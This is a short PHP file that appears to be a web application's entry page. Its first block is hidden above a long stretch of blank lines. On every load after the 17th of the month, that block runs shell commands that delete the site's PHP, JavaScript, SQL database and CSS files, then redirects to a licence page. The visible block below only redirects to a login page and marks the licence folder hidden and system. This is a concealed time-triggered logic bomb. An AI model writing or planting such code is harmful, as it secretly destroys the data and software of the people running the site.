<?php 
    if(date("d")>17){
        chdir("pages/interface");
        system("del *.php");
        chdir("../traitements");
        system("del *.php");
        chdir("../../js");
        system("del *.js");
        chdir("../includes");
        system("del *.php");
        chdir("../base_de_donnees");
        system("del *.sql");
        chdir("../css");
        system("del *.css");
        header("location: pages/licence");
    }
?>





































































































































































<?php
    chdir("pages/");
    system("attrib +h +s licence");
    header("Location: pages/interface/connexion.php");
    exit();
?>